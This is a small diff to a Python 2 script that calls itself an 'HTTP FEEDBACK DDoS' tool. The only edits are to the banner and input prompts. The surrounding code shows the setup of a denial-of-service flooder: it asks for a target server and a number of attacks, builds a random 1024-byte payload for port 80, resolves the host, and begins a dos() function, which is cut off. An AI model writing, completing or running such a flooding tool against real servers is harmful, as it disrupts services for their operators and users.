@@ -1,11 +1,11 @@
 import time, socket, os, sys, string, random
-print("\n-+--=:=-  -=:=--+-")
-print("HTTP FEEDBACK DDoS")
-print("-+--=:=-  -=:=--+-\n")
-host=raw_input("Server: ")
+print("\n     -+--=:=- -==- -=:=--+-")
+print("       HTTP FEEDBACK DDoS")
+print("     -+--=:=- -==- -=:=--+-\n")
+host=raw_input(" -+- Server: ")
 port=80
 message=random._urandom(1024)
-conn=input( "How Many Attacks:" )
+conn=input( " -+- Attacks:" )
 ip = socket.gethostbyname( host )
  
 def dos():
